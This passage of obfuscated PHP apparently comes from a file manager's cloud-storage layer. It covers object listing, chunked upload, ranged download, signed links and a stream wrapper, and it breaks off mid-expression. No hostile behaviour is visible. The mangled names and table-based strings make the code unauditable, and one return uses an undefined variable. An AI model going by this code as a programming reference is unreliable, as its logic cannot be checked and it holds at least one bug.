$this->ussRequest($Å±Äˆø, $ë¤ß”œò[261], !1, $òÉğèàµ); return !$—äğ¼ª×[$ë¤ß”œò[1284]] ? !1 : $—äğ¼ª×[$ë¤ß”œò[1274]]; } private function fileList($Ø—¬ô—‹, &$‡ş±±¶ö, &$şÂ’à¤, $ìæˆÂÒ = false) { $èµ”şîÊ =& $_SERVER[óÔë„ú]; $²ÌãÌÏ• = $èµ”şîÊ[12]; $¸ÈÁ¡· = 1000; $àÊğ…­­ = rtrim($Ø—¬ô—‹, $èµ”şîÊ[8]) . $èµ”şîÊ[8]; while (!0) { check_abort(); $å€¦‰’ç = $this->listObjs($Ø—¬ô—‹, $²ÌãÌÏ•, $¸ÈÁ¡·); if (!$å€¦‰’ç) { return !1; } $²ÌãÌÏ• = isset($å€¦‰’ç[$èµ”şîÊ[1559]]) ? $å€¦‰’ç[$èµ”şîÊ[1559]] : $èµ”şîÊ[12]; $÷Ë„Ï†í = isset($å€¦‰’ç[$èµ”şîÊ[1560]]) ? $å€¦‰’ç[$èµ”şîÊ[1560]] : array(); foreach ($÷Ë„Ï†í as $§¥öó’ö) { $Ú„¯š®– = $§¥öó’ö[$èµ”şîÊ[33]] == $èµ”şîÊ[78] ? !0 : !1; $»½¡‡÷¼ = ltrim($àÊğ…­­ . $§¥öó’ö[$èµ”şîÊ[32]], $èµ”şîÊ[8]) . ($Ú„¯š®– ? $èµ”şîÊ[8] : $èµ”şîÊ[12]); $±§ŒÏá˜ = array($èµ”şîÊ[32] => $»½¡‡÷¼, $èµ”şîÊ[33] => $Ú„¯š®– ? $èµ”şîÊ[78] : $èµ”şîÊ[230], $èµ”şîÊ[79] => $§¥öó’ö[$èµ”şîÊ[413]], $èµ”şîÊ[1555] => $§¥öó’ö[$èµ”şîÊ[1561]]); $this->cacheMethodInfoSet($»½¡‡÷¼, $Ú„¯š®–, $±§ŒÏá˜); if ($Ú„¯š®–) { $‡ş±±¶ö[] = $»½¡‡÷¼; if ($ìæˆÂÒ) { $this->fileList($»½¡‡÷¼, $‡ş±±¶ö, $şÂ’à¤, $ìæˆÂÒ); } continue; } $şÂ’à¤[] = $±§ŒÏá˜; } if (count($÷Ë„Ï†í) < $¸ÈÁ¡·) { break; } } $this->cacheMethodInfoSet($Ø—¬ô—‹, !0); } public function listPath($ÑìøËò¶, $Ô½÷áå® = false) { $¶ŠåÙ±‚ =& $_SERVER[óÔë„ú]; $ÑÅèğÚ± = $¨åÙø«Î = array(); $this->fileList($ÑìøËò¶, $ÑÅèğÚ±, $¨åÙø«Î); foreach ($ÑÅèğÚ± as $Õ¼’÷ => $˜ííı¹) { $ÑÅèğÚ±[$Õ¼’÷] = $this->folderInfo($˜ííı¹, $Ô½÷áå®); } foreach ($¨åÙø«Î as $Õ¼’÷ => $˜ííı¹) { $¨åÙø«Î[$Õ¼’÷] = $this->fileInfo($˜ííı¹[$¶ŠåÙ±‚[32]], $Ô½÷áå®, $˜ííı¹); } return array($¶ŠåÙ±‚[85] => $ÑÅèğÚ±, $¶ŠåÙ±‚[86] => $¨åÙø«Î); } public function has($“ãúÎ, $Úâ‡ğ£° = false, $À…¸äâï = true) { $üÏÌÓûÂ =& $_SERVER[óÔë„ú]; $×‡ÔÅë· = $üÏÌÓûÂ[12]; $ì¶ˆüˆ³ = 500; $ÜÒ„Æ ñ = 0; $ÉšŞ¹ŠÌ = 0; $Í©®÷Ü = rtrim($“ãúÎ, $üÏÌÓûÂ[8]) . $üÏÌÓûÂ[8]; while (!0) { check_abort(); $“£îçß = $this->listObjs($“ãúÎ, $×‡ÔÅë·, $ì¶ˆüˆ³); if (!$“£îçß) { return !1; } $×‡ÔÅë· = isset($“£îçß[$üÏÌÓûÂ[1559]]) ? $“£îçß[$üÏÌÓûÂ[1559]] : $üÏÌÓûÂ[12]; $×èä½‚ = isset($“£îçß[$üÏÌÓûÂ[1560]]) ? $“£îçß[$üÏÌÓûÂ[1560]] : array(); if (empty($×èä½‚)) { break; } $ƒ®²Ôò = array_filter($×èä½‚, function ($¤•Ò…) { $ôÂ¥Îşğ =& $_SERVER[óÔë„ú]; return $¤•Ò…[$ôÂ¥Îşğ[33]] == $ôÂ¥Îşğ[78]; }); $ ½Ù´„® = count($×èä½‚); $ƒ®²Ôò = count($ƒ®²Ôò); $®æäÏÎÚ = $ ½Ù´„® - $ƒ®²Ôò; if ($Úâ‡ğ£°) { $ÉšŞ¹ŠÌ += $ƒ®²Ôò; $ÜÒ„Æ ñ += $®æäÏÎÚ; if ($ ½Ù´„® < $ì¶ˆüˆ³) { break; } continue; } if ($À…¸äâï) { if ($®æäÏÎÚ) { return !0; } } else { if ($ƒ®²Ôò) { return !0; } } if ($ ½Ù´„® < $ì¶ˆüˆ³) { break; } } if ($Úâ‡ğ£°) { return array($üÏÌÓûÂ[239] => $ÜÒ„Æ ñ, $üÏÌÓûÂ[240] => $ÉšŞ¹ŠÌ); } return !1; } public function listAll($Õƒ–€®ğ) { $„Ô€ß…Å =& $_SERVER[óÔë„ú]; $şğÀı¨º = $ìè¦Ë³ï = array(); $this->fileList($Õƒ–€®ğ, $şğÀı¨º, $ìè¦Ë³ï, !0); $ÙÄñ÷™ = array_to_keyvalue($ìè¦Ë³ï, $„Ô€ß…Å[32]); foreach ($şğÀı¨º as $‚µ×Š…‰) { if (is_string($‚µ×Š…‰)) { $ÙÄñ÷™[$‚µ×Š…‰] = array($„Ô€ß…Å[79] => 0); } } return $this->listAllFiles($Õƒ–€®ğ, $ÙÄñ÷™); } public function canRead($ÚúğüÙ…) { return $this->exist($ÚúğüÙ…) ? !0 : !1; } public function canWrite($‘¤¾ú¹À) { return $this->exist($‘¤¾ú¹À) ? !0 : !1; } public function getContent($™ØëÎÍŸ) { return $this->fileSubstr($™ØëÎÍŸ, 0, -1); } public function setContent($³Ä¹¤œ…, $–ğĞš‚¢ = '') { $Õ¬Ë­Êû =& $_SERVER[óÔë„ú]; if (!$–ğĞš‚¢) { $‰‘úâöô = $this->ussRequest($³Ä¹¤œ…, $Õ¬Ë­Êû[257]); return $‰‘úâöô[$Õ¬Ë­Êû[1284]]; } $“ÁŒŞŒ“ = $this->tempFile($this->pathThis($³Ä¹¤œ…)); file_put_contents($“ÁŒŞŒ“, $–ğĞš‚¢); if ($this->upload($³Ä¹¤œ…, $“ÁŒŞŒ“)) { $this->tempFileRemve($“ÁŒŞŒ“); return !0; } return !1; } public function fileSubstr($Š™ÕÜŸË, $šµœÄö°, $¯öÇìø¤) { $şş’üŒè =& $_SERVER[óÔë„ú]; if (!($Û¼§øÅ = $this->link($Š™ÕÜŸË))) { return !1; } $÷…ÁÓù¿ = !1; if ($¯öÇìø¤ > 0) { $¶ø´ëáõ = $šµœÄö° + $¯öÇìø¤ - 1; $÷…ÁÓù¿ = array($şş’üŒè[1520] . $šµœÄö° . $şş’üŒè[462] . $¶ø´ëáõ); } $æ¯Õ•ò = url_request($Û¼§øÅ, $şş’üŒè[261], !1, $÷…ÁÓù¿); return $æ¯Õ•ò[$şş’üŒè[810]] ? $æ¯Õ•ò[$şş’üŒè[1274]] : !1; } public function upload($à–‹³‹, $ØÍÉä–±, $È‚Ùµ¢› = false, $Å¹´„ßæ = REPEAT_REPLACE) { $üŞ†ŞÌ² =& $_SERVER[óÔë„ú]; $Ä±µç·· = IO::size($ØÍÉä–±); if ($Ä±µç·· <= 1024 * 1024 * 200) { $á‘íø… = array($üŞ†ŞÌ²[1562] . $ØÍÉä–±); $±şà¹ş¸ = $this->ussRequest($à–‹³‹, $üŞ†ŞÌ²[259], $á‘íø…); return $±şà¹ş¸[$üŞ†ŞÌ²[1284]] ? $this->getPathOuter($à–‹³‹) : !1; } $…Ëø¤ëÉ = 1024 * 1024 * 10; $áíÑÎíñ = array($üŞ†ŞÌ²[1563], $üŞ†ŞÌ²[1564] . $Ä±µç··, $üŞ†ŞÌ²[1565], $üŞ†ŞÌ²[1566] . $…Ëø¤ëÉ); $±şà¹ş¸ = $this->ussRequest($à–‹³‹, $üŞ†ŞÌ²[259], !1, $áíÑÎíñ); if (!$±şà¹ş¸[$üŞ†ŞÌ²[1284]]) { return !1; } $•ÈØ—Û± = $±şà¹ş¸[$üŞ†ŞÌ²[1274]]; $œÆÚæŞ¬ = 0; $½¨Ä§ Å = $•ÈØ—Û±[$üŞ†ŞÌ²[1567]]; $ê¡§Ë° = fopen($ØÍÉä–±, $üŞ†ŞÌ²[1443]); if (!$ê¡§Ë°) { return !1; } do { $…§âøµ = $•ÈØ—Û±[$üŞ†ŞÌ²[1568]]; fseek_64($ê¡§Ë°, $œÆÚæŞ¬); $È¦Òö×À = fread($ê¡§Ë°, $…§âøµ); $µª±š÷« = 0; do { $µª±š÷«++; $•ÈØ—Û± = $this->uploadPart($à–‹³‹, $•ÈØ—Û±, $È¦Òö×À); } while (!$•ÈØ—Û± && $µª±š÷« < 3); if (!$•ÈØ—Û±) { return !1; } $½¨Ä§ Å = $•ÈØ—Û±[$üŞ†ŞÌ²[1567]]; $œÆÚæŞ¬ += $…§âøµ; } while ($½¨Ä§ Å != -1); fclose($ê¡§Ë°); $áíÑÎíñ = array($üŞ†ŞÌ²[1569], $üŞ†ŞÌ²[1570] . $•ÈØ—Û±[$üŞ†ŞÌ²[1571]], $üŞ†ŞÌ²[1565]); $±şà¹ş¸ = $this->ussRequest($à–‹³‹, $üŞ†ŞÌ²[259], !1, $áíÑÎíñ); return $±şà¹ş¸[$üŞ†ŞÌ²[1284]] ? $this->getPathOuter($¸‡Æª¢Û) : !1; } private function uploadPart($©”Œ®ÚÄ, $«ØüÁ…—, &$†Ö„–¬÷) { $Æ­µ‚Ø­ =& $_SERVER[óÔë„ú]; $—ïğü¹ = array($Æ­µ‚Ø­[1572], $Æ­µ‚Ø­[1570] . $«ØüÁ…—[$Æ­µ‚Ø­[1571]], $Æ­µ‚Ø­[1573] . $«ØüÁ…—[$Æ­µ‚Ø­[1567]], $Æ­µ‚Ø­[146] . $«ØüÁ…—[$Æ­µ‚Ø­[1568]]); $£èÇ²ş = $this->ussRequest($©”Œ®ÚÄ, $Æ­µ‚Ø­[259], $†Ö„–¬÷, $—ïğü¹); return !$£èÇ²ş[$Æ­µ‚Ø­[1284]] ? $£èÇ²ş[$Æ­µ‚Ø­[1284]] : $£èÇ²ş[$Æ­µ‚Ø­[1274]]; } public function uploadFormData($¥»Ãçòœ, $àş­ø¹¦ = 3600) { return $this->uploadPolicy($¥»Ãçòœ, $àş­ø¹¦); } public function multiUploadFormData($×ˆ—‚ , $€œôïê© = 3600) { $´•Ÿ¤Î =& $_SERVER[óÔë„ú]; $·«¦‚÷ = (int) $GLOBALS[$´•Ÿ¤Î[7]][$´•Ÿ¤Î[79]]; return $this->uploadPolicy($×ˆ—‚ , $€œôïê©, $·«¦‚÷); } private function uploadPolicy($Ş·Ö®øş, $š¦ğ®˜Â = 3600, $‡”‹‡¨Û = 0) { $¹Ç÷Ø–‡ =& $_SERVER[óÔë„ú]; $ç×Ş‹ÈÇ = $¹Ç÷Ø–‡[8] . $this->bucket; $ú£ÅÉÑ® = gmdate($¹Ç÷Ø–‡[1478]); $ŸíÔ‰á” = array($¹Ç÷Ø–‡[1574] => $this->bucket, $¹Ç÷Ø–‡[1575] => $Ş·Ö®øş, $¹Ç÷Ø–‡[1576] => time() + $š¦ğ®˜Â, $¹Ç÷Ø–‡[1577] => $ú£ÅÉÑ®); if ($‡”‹‡¨Û) { $ŸíÔ‰á”[$¹Ç÷Ø–‡[1463]] = $‡”‹‡¨Û; } $¹âùÃ = base64_encode(json_encode($ŸíÔ‰á”)); $š’›Ìùå = base64_encode(hash_hmac($¹Ç÷Ø–‡[1531], "\120\117\123\124\x26{$ç×Ş‹ÈÇ}\46{$ú£ÅÉÑ®}\x26{$¹âùÃ}", md5("{$this->userpass}"), !0)); $êœû• = array($¹Ç÷Ø–‡[293] => $¹âùÃ, $¹Ç÷Ø–‡[1578] => "\125\120\131\125\116\40{$this->username}\72{$š’›Ìùå}", $¹Ç÷Ø–‡[208] => $this->endpoint . $ç×Ş‹ÈÇ); return $êœû•; } public function download($µçêÀÀÄ, $¤õ•ƒ·ã) { $ÒÎ§·È = IO::getPathInner(IO::mkfile($¤õ•ƒ·ã)); if (!($ÖÖÏÚŒƒ = $this->link($µçêÀÀÄ))) { return !1; } $Ú¼úóå = 0; $“¾ÄĞ¨¼ = 1024 * 200; $®‡–²Çß = fopen($ÒÎ§·È, $_SERVER[óÔë„ú][1526]); while (!0) { $ª˜õß± = $this->fileSubstr($µçêÀÀÄ, $Ú¼úóå, $“¾ÄĞ¨¼); if ($ª˜õß± === !1) { return !1; } fwrite($®‡–²Çß, $ª˜õß±); $Ú¼úóå += $“¾ÄĞ¨¼; if (strlen($ª˜õß±) < $“¾ÄĞ¨¼) { break; } } fclose($®‡–²Çß); return $¤õ•ƒ·ã; } public function link($šØ­ØùŒ, $ÜñŒ¼™¦ = array()) { $ñó™Â   =& $_SERVER[óÔë„ú]; $šØ­ØùŒ = trim($šØ­ØùŒ, $ñó™Â  [8]); if (!empty($this->token)) { $¦ñšÂê = strtotime(date($ñó™Â  [1579])); $öç“»ó = substr(md5($this->token . $ñó™Â  [360] . $¦ñšÂê . $ñó™Â  [1580] . $šØ­ØùŒ), 12, 8) . $¦ñšÂê; $ÜñŒ¼™¦[] = $ñó™Â  [1581] . $öç“»ó; } $Ó‰³Ùø® = !empty($ÜñŒ¼™¦) ? $ñó™Â  [76] . implode($ñó™Â  [360], $ÜñŒ¼™¦) : $ñó™Â  [12]; return $this->getHost() . $ñó™Â  [8] . $šØ­ØùŒ . $Ó‰³Ùø®; } public function fileOut($îÀÆ‡İĞ, $¾˜£¾­é = false, $ Íåş¹ = false, $¡‚¸…Ø” = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($îÀÆ‡İĞ, $¾˜£¾­é, $ Íåş¹, $¡‚¸…Ø”); } if (!$ Íåş¹) { $ Íåş¹ = $this->pathThis($îÀÆ‡İĞ); } $ä‡ŸÏŸ = $¾˜£¾­é ? array($_SERVER[óÔë„ú][1582] . rawurlencode($ Íåş¹)) : array(); $„Õ©ÖÛú = $this->link($îÀÆ‡İĞ, $ä‡ŸÏŸ); $this->fileOutLink($„Õ©ÖÛú); } public function fileOutServer($®Í †è“, $‡ºÆÀµ = false, $ÓÑäÄé = false, $êÂá‡ = '') { parent::fileOut($®Í †è“, $‡ºÆÀµ, $ÓÑäÄé, $êÂá‡); } public function fileOutImage($ÄõåÅî“, $±Ä–Ùªã = 250) { $ê©¯†î = $this->link($ÄõåÅî“ . $_SERVER[óÔë„ú][1583] . $±Ä–Ùªã); $this->fileOutLink($ê©¯†î); } public function fileOutImageServer($û“µÃ¯, $ïœ°×šœ = 250) { parent::fileOutImage($û“µÃ¯, $ïœ°×šœ); } public function hashMd5($î…ØÆÅæ) { $‹ƒâú =& $_SERVER[óÔë„ú]; $‹€Œç›é = $this->_objectMeta($î…ØÆÅæ); return isset($‹€Œç›é[$‹ƒâú[245]]) ? $‹€Œç›é[$‹ƒâú[245]] : !1; } public function size($äûñ…û) { $àÙ‡÷¡’ = $this->objectMeta($äûñ…û); return $àÙ‡÷¡’ ? $àÙ‡÷¡’[$_SERVER[óÔë„ú][79]] : 0; } public function info($Ù ‚ŞÄÍ) { if ($this->isFolder($Ù ‚ŞÄÍ)) { return $this->folderInfo($Ù ‚ŞÄÍ); } else { if ($this->isFile($Ù ‚ŞÄÍ)) { return $this->fileInfo($Ù ‚ŞÄÍ); } } return !1; } public function exist($óäŠ³Ó¯) { return $this->isFile($óäŠ³Ó¯) || $this->isFolder($óäŠ³Ó¯); } public function isFile($ÄªÔ¾§ñ) { return !$this->isFolder($ÄªÔ¾§ñ) && $this->objectMeta($ÄªÔ¾§ñ); } public function isFolder($÷¹úÆº²) { return $this->cacheMethod($_SERVER[óÔë„ú][179], $÷¹úÆº²); } protected function objectMeta($•ğ¹²Óò) { return $this->cacheMethod($_SERVER[óÔë„ú][181], $•ğ¹²Óò); } protected function _objectMeta($±³ºÜƒ) { $›”ÙùÖÄ =& $_SERVER[óÔë„ú]; if ($±³ºÜƒ == $›”ÙùÖÄ[12] || $±³ºÜƒ == $›”ÙùÖÄ[8]) { return array(); } $Š³ù¨ = $this->ussRequest($±³ºÜƒ, $›”ÙùÖÄ[1584]); if (!$Š³ù¨[$›”ÙùÖÄ[1284]]) { return null; } $…ºñò‡à = isset($Š³ù¨[$›”ÙùÖÄ[1274]]) ? $Š³ù¨[$›”ÙùÖÄ[1274]] : array(); if (!isset($…ºñò‡à[$›”ÙùÖÄ[1585]])) { return null; } $›²¥ÍÖ¡ = array($›”ÙùÖÄ[33] => isset($…ºñò‡à[$›”ÙùÖÄ[1585]]) ? $…ºñò‡à[$›”ÙùÖÄ[1585]] : null, $›”ÙùÖÄ[79] => isset($…ºñò‡à[$›”ÙùÖÄ[1586]]) ? $…ºñò‡à[$›”ÙùÖÄ[1586]] : null, $›”ÙùÖÄ[245] => isset($…ºñò‡à[$›”ÙùÖÄ[1587]]) ? $…ºñò‡à[$›”ÙùÖÄ[1587]] : null, $›”ÙùÖÄ[1554] => isset($…ºñò‡à[$›”ÙùÖÄ[1588]]) ? $…ºñò‡à[$›”ÙùÖÄ[1588]] : null); $›²¥ÍÖ¡[$›”ÙùÖÄ[1555]] = isset($…ºñò‡à[$›”ÙùÖÄ[1589]]) ? strtotime($…ºñò‡à[$›”ÙùÖÄ[1589]]) : $›²¥ÍÖ¡[$›”ÙùÖÄ[1554]]; return $›²¥ÍÖ¡; } protected function _isFolder($†è·ñ£¬) { $ÜÅËıÔ =& $_SERVER[óÔë„ú]; if ($†è·ñ£¬ == $ÜÅËıÔ[12] || $†è·ñ£¬ == $ÜÅËıÔ[8]) { return !0; } $„†÷™¼› = $this->_objectMeta($†è·ñ£¬); return isset($„†÷™¼›[$ÜÅËıÔ[33]]) && $„†÷™¼›[$ÜÅËıÔ[33]] == $ÜÅËıÔ[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¿§Õ¥ù¢ = false) { } public function exist($»ĞÜ§”¼) { $¦„Õ—ı = $this->info($»ĞÜ§”¼); return $¦„Õ—ı[$_SERVER[óÔë„ú][232]]; } public function isFile($Åû–É”‹) { $íºº”ê = $this->info($Åû–É”‹); return $íºº”ê[$_SERVER[óÔë„ú][232]]; } public function isFolder($“Şí°á‚) { return !1; } public function size($„¹·· À) { $Ø¨ÃÍ³ = $this->info($„¹·· À); return $Ø¨ÃÍ³[$_SERVER[óÔë„ú][79]]; } public function info($ŒÏÃ’É) { return $this->infoParse($ŒÏÃ’É); } public function infoAuth($ú‡“Áë) { return $this->infoParse($ú‡“Áë); } public function infoWithChildren($Şöˆ…ùÀ) { return $this->infoParse($Şöˆ…ùÀ); } public function infoFull($úı¯»›) { return $this->infoParse($úı¯»›); } private function infoParse($æÀÇÊ²) { $ó¯’ï£³ =& $_SERVER[óÔë„ú]; $®êËß˜ı = $this->header($æÀÇÊ²); if (!$®êËß˜ı || !$®êËß˜ı[$ó¯’ï£³[810]]) { return !1; } $“˜ŞŞÏß = _get($®êËß˜ı, $ó¯’ï£³[413], 0); $íÃ•ó¸ƒ = array($ó¯’ï£³[32] => $®êËß˜ı[$ó¯’ï£³[32]], $ó¯’ï£³[87] => $æÀÇÊ², $ó¯’ï£³[33] => $ó¯’ï£³[230], $ó¯’ï£³[79] => intval($“˜ŞŞÏß), $ó¯’ï£³[169] => get_path_ext($®êËß˜ı[$ó¯’ï£³[32]]), $ó¯’ï£³[1440] => $“˜ŞŞÏß > 0 && $®êËß˜ı[$ó¯’ï£³[1590]], $ó¯’ï£³[1441] => !1); return $íÃ•ó¸ƒ; } private function header($½ëëŸîË) { $äïªışø =& $_SERVER[óÔë„ú]; if (isset(self::$_cacheHeader[$½ëëŸîË])) { return self::$_cacheHeader[$½ëëŸîË]; } $àÍá·—À = isset($GLOBALS[$äïªışø[1591]]) ? $GLOBALS[$äïªışø[1591]] : !1; $GLOBALS[$äïªışø[1591]] = !0; self::$_cacheHeader[$½ëëŸîË] = url_header($½ëëŸîË); $GLOBALS[$äïªışø[1591]] = $àÍá·—À; return self::$_cacheHeader[$½ëëŸîË]; } public function hashSimple($Èæ•ƒø, $á¾‰¶·ô = false) { $†Œæ’ü£ =& $_SERVER[óÔë„ú]; $­‚ï©ù = $this->info($Èæ•ƒø); if (!$­‚ï©ù || !$­‚ï©ù[$†Œæ’ü£[232]]) { return !1; } $ïˆØó²° = $­‚ï©ù[$†Œæ’ü£[79]]; $½÷«áëÕ = 200; $°ˆ×ØØß = 50; if ($ïˆØó²° <= $½÷«áëÕ * $°ˆ×ØØß) { return md5($this->fileSubstr($Èæ•ƒø, 0, $ïˆØó²°)) . $ïˆØó²°; } $ÛşÉèª¦ = intval($ïˆØó²° / $°ˆ×ØØß); $÷İ”ˆÀÆ = $†Œæ’ü£[12]; $ì†°—¿¢ = timeFloat(); $ÄÑëüÖ = 15; for ($¾‡ş–üš = 0; $¾‡ş–üš < $°ˆ×ØØß; $¾‡ş–üš++) { if (timeFloat() - $ì†°—¿¢ > $ÄÑëüÖ) { return !1; } $ïé“Ë = $this->fileSubstr($Èæ•ƒø, $ÛşÉèª¦ * $¾‡ş–üš, $½÷«áëÕ); if (!$ïé“Ë) { return !1; } $÷İ”ˆÀÆ .= $ïé“Ë; } $÷İ”ˆÀÆ .= $this->fileSubstr($Èæ•ƒø, $ïˆØó²° - $½÷«áëÕ, $½÷«áëÕ); return md5($÷İ”ˆÀÆ) . $ïˆØó²°; } public function getContent($Øˆ¸†©Ä) { return $this->fileSubstr($Øˆ¸†©Ä); } public function fileSubstr($º›†‚¾Ü, $”£³ŠÔó = 0, $›ŸšÈÚ• = -1) { $Ö‚Öœ™È =& $_SERVER[óÔë„ú]; $»®ìŞÈ¼ = $this->info($º›†‚¾Ü); if (!$»®ìŞÈ¼ || !$»®ìŞÈ¼[$Ö‚Öœ™È[232]] && $»®ìŞÈ¼[$Ö‚Öœ™È[79]] > 1024 * 1024 * 10) { return !1; } if ($›ŸšÈÚ• === -1) { $›ŸšÈÚ• = $»®ìŞÈ¼[$Ö‚Öœ™È[79]]; } if ($›ŸšÈÚ• == 0) { return $Ö‚Öœ™È[12]; } $éß£ƒÄ¾ = array($Ö‚Öœ™È[1592] . $”£³ŠÔó . $Ö‚Öœ™È[845] . ($”£³ŠÔó + $›ŸšÈÚ• - 1)); $Ê´çß¢ = url_request($º›†‚¾Ü, $Ö‚Öœ™È[261], !1, $éß£ƒÄ¾, !1, !1, 30); return $Ê´çß¢[$Ö‚Öœ™È[1274]] ? $Ê´çß¢[$Ö‚Öœ™È[1274]] : $Ö‚Öœ™È[12]; } public function download($Ö×Ì¶­ğ, $îÆß”¯İ) { Downloader::start($Ö×Ì¶­ğ, $îÆß”¯İ); return $îÆß”¯İ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($›«ã©Üß, $ºÅÛ§êÓ = '') { $this->info = $this->info($›«ã©Üß); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[óÔë„ú][87]]; $this->pathOpen = $›«ã©Üß; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$›«ã©Üß])) { self::$_chunkBuffer[$›«ã©Üß] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($´õöÜÁÒ) { $Î¤Õ¡²õ = $this->fileSubstr($this->pose, $´õöÜÁÒ); $this->pose += strlen($Î¤Õ¡²õ); return $Î¤Õ¡²õ; } public function stream_tell() { return $this->pose; } public function stream_seek($Ğ»æ¶âê, $¢µšˆÅ”) { $ Ê¬Æ±Ì =& $_SERVER[óÔë„ú]; if ($¢µšˆÅ” == SEEK_SET) { $this->pose = $Ğ»æ¶âê; } else { if ($¢µšˆÅ” == SEEK_CUR) { $this->pose += $Ğ»æ¶âê; } else { if ($¢µšˆÅ” == SEEK_END) { $this->pose = $this->info[$ Ê¬Æ±Ì[79]] + intval($Ğ»æ¶âê); } } } if ($Ğ»æ¶âê < 0) { $this->pose = $this->info[$ Ê¬Æ±Ì[79]] + $Ğ»æ¶âê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[óÔë„ú][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ù¥šØˆ˜, $Ş¿°Û©İ) { $”¸ëšê =& $_SERVER[óÔë„ú]; $Ä¢àæõ² = $this->info($ù¥šØˆ˜); return array($”¸ëšê[1593] => 0, $”¸ëšê[1594] => 0, $”¸ëšê[16] => 32768 + 511, $”¸ëšê[1595] => 0, $”¸ëšê[1596] => 0, $”¸ëšê[1597] => 0, $”¸ëšê[1598] => 0, $”¸ëšê[79] => $Ä¢àæõ²[$”¸ëšê[79]], $”¸ëšê[1599] => $Ä¢àæõ²[$”¸ëšê[1439]], $”¸ëšê[1555] => $Ä¢àæõ²[$”¸ëšê[88]], $”¸ëšê[1554] => $Ä¢àæõ²[$”¸ëšê[231]], $”¸ëšê[1600] => 0, $”¸ëšê[1601] => 0); } static $fileInfo = array(); public function info($ÜÖ˜ØŠ±) { $Ö·‘‰“ = $_SERVER[óÔë„ú][1602]; if (isset(self::$fileInfo[$ÜÖ˜ØŠ±])) { return self::$fileInfo[$ÜÖ˜ØŠ±]; } if (substr($ÜÖ˜ØŠ±, 0, strlen($Ö·‘‰“)) != $Ö·‘‰“) { return !1; } self::$fileInfo[$ÜÖ˜ØŠ±] = IO::info(substr($ÜÖ˜ØŠ±, strlen($Ö·‘‰“))); return self::$fileInfo[$ÜÖ˜ØŠ±]; } public static function read($é®€¼êÔ, $Ó€ûêµæ, $š¤öÚŞû) { if (!isset(self::$_fopenCache[$é®€¼êÔ])) { $ûº¸ıôÎ = new StreamWrapperIO(); $ûº¸ıôÎ->stream_open($é®€¼êÔ); self::$_fopenCache[$é®€¼êÔ] = $ûº¸ıôÎ; } $ûº¸ıôÎ = self::$_fopenCache[$é®€¼êÔ]; return $ûº¸ıôÎ->fileSubstr($Ó€ûêµæ, $š¤öÚŞû); } public static function _read($¡´ŸàÒ, $¥îÀûà·, $ú•µêÀ) { $å ÚÙé£ =& $_SERVER[óÔë„ú]; $³‘ÍÙåè = fopen($¡´ŸàÒ, $å ÚÙé£[1443]); if (!$³‘ÍÙåè) { return $å ÚÙé£[12]; } $ó¡æ×Âç = 8192; fseek($³‘ÍÙåè, $¥îÀûà·, SEEK_SET); $û»ª¾ğ± = $å ÚÙé£[12]; $Õ’Ú‘ä = 0; while ($Õ’Ú‘ä < $ú•µêÀ) { $—ıèù³ = min($ó¡æ×Âç, $ú•µêÀ - $Õ’Ú‘ä); $û»ª¾ğ± .= fread($³‘ÍÙåè, $—ıèù³); $Õ’Ú‘ä += $—ıèù³; } fclose($³‘ÍÙåè); return $û»ª¾ğ±; } public function fileSubstr($€ëúÆŒÛ, $™ÜÓìì) { $”ÜóÑË =& $_SERVER[óÔë„ú]; $ü‘ÔãÂŸ = $this->info[$”ÜóÑË[79]]; $ûÜ¦ßÎš = $€ëúÆŒÛ; $°Ê¸¨¸‹ = $™ÜÓìì; if ($€ëúÆŒÛ < 0) { $€ëúÆŒÛ = $ü‘ÔãÂŸ + $€ëúÆŒÛ; } if ($™ÜÓìì === !1) { $™ÜÓìì = $ü‘ÔãÂŸ - $€ëúÆŒÛ; } if ($€ëúÆŒÛ + $™ÜÓìì > $ü‘ÔãÂŸ) { $™ÜÓìì = $ü‘ÔãÂŸ - $€ëúÆŒÛ; } if ($™ÜÓìì <= 0) { return $”ÜóÑË[12]; } if ($€ëúÆŒÛ < 0 || $€ëúÆŒÛ >= $ü‘ÔãÂŸ || $™ÜÓìì <= 0 || $™ÜÓìì > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\x65\x52\145\141\x64\40\x65\162\x72\x6f\x72\x21\x20\x73\164\141\x72\164\75{$€ëúÆŒÛ}\x3b\x6c\x65\156\x67\164\150\x3d{$™ÜÓìì}\73\40\x73\151\172\x65\75{$ü‘ÔãÂŸ}\73"); } $…ç¡àÒÍ = 64 * 1024; $ÊÔ¼ÜÃ =& self::$_chunkBuffer[$this->path]; if (!$ÊÔ¼ÜÃ) { $ÊÔ¼ÜÃ = array(); } $’éÙÒ£ = 0; $Ê¹¡ÇŸ = 0; $ÆİšÁ† = $”ÜóÑË[12]; foreach ($ÊÔ¼ÜÃ as $’éÙÒ£ => $ÆİšÁ†) { $’éÙÒ£ = intval($’éÙÒ£); $Ê¹¡ÇŸ = $’éÙÒ£ + strlen($ÆİšÁ†); if ($€ëúÆŒÛ >= $Ê¹¡ÇŸ) { continue; } if ($€ëúÆŒÛ >= $’éÙÒ£ && $€ëúÆŒÛ + $™ÜÓìì <= $Ê¹¡ÇŸ) { return substr($ÆİšÁ†, $€ëúÆŒÛ - $’éÙÒ£, $™ÜÓìì); } break; } if (count($ÊÔ¼ÜÃ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($”ÜóÑË[1603], $”ÜóÑË[1604] . count($ÊÔ¼ÜÃ) . "\x3b\x73\x74\141\162\164\x3d{$€ëúÆŒÛ}\x2c\154\x65\156\x67\164\150\x3d{$™ÜÓìì}\x3b\x70\x6f\x73\145\72{$’éÙÒ£}\x7e{$Ê¹¡ÇŸ}"); throw new Exception($”ÜóÑË[1605]); } $ıÁ€Æó» = intval($€ëúÆŒÛ / $…ç¡àÒÍ) * $…ç¡àÒÍ; $ç—®ıçÄ = ceil(($€ëúÆŒÛ + $™ÜÓìì) / 